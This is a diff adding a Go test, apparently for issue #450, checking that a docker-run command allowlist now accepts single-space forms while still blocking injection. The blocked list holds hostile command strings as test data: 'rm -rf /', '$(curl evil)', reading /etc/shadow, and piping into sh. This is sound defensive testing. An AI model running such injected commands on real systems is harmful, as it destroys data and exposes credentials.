@@ -145,3 +145,35 @@ func TestBashScriptRunnerIsPrivilegedAndPathLocked(t *testing.T) {
 		}
 	}
 }
+
+// #450: the docker-run pattern demanded TWO spaces after `run` - the normal
+// `docker run nginx` was refused while `docker run  nginx` passed, so every
+// operator writing the obvious form got a confusing refusal. Widening a
+// security allowlist gets its own gate: the single-space forms must pass AND
+// the injection shapes the pattern exists to block must still be blocked.
+func TestDockerRunSingleSpace450(t *testing.T) {
+	a := Allowlist{privileged: true}
+	allowed := []string{
+		"docker run nginx",
+		"docker run --name=web nginx",
+		"docker run --network host registry.example.com/img:tag",
+		"docker run  nginx", // the old accidental form keeps working
+	}
+	for _, c := range allowed {
+		if ok, reason := a.IsAllowed(c); !ok {
+			t.Errorf("expected allowed: %q (%s)", c, reason)
+		}
+	}
+	blocked := []string{
+		"docker run nginx; rm -rf /",
+		"docker run $(curl evil)",
+		"docker run nginx && cat /etc/shadow",
+		"docker run `id`",
+		"docker run nginx | sh",
+	}
+	for _, c := range blocked {
+		if ok, _ := a.IsAllowed(c); ok {
+			t.Errorf("expected blocked: %q", c)
+		}
+	}
+}
